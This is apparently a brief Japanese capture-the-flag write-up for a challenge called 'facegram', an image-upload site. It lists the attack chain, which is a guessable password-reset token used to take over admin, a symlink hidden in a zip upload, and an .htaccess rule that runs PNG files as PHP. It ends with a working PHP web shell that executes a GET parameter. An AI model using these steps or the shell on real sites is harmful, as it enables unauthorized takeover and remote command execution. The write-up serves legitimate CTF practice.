# facegram

## 概要

* 画像をアップロードして公開するサイト
* ユーザー管理されている

## 観察

* admin がいる
  * admin 用のページがあるのでは
* forgot-password ページがある
  * admin のパスワードをリセットできる？ → できる
* admin ページ
  * zip ファイルで一括アップロードできる

## 解法

* パスワードリセットリンクが単純
  * token を変えることで admin のパスワードを変更できる
* zip アップロード
  * シンボリックリンクを忍ばせておく
* .htaccess 追加
  * png ファイルを php と認識させる
  * https://github.com/Red-Knights-CTF/writeups/tree/master/2020/Boot2root_ctf/Upload

以下を配置して、Postman で叩くと良さげ
```php
<?php
$p = $_GET["p"];
$o = shell_exec($p);
echo $o;
?>
```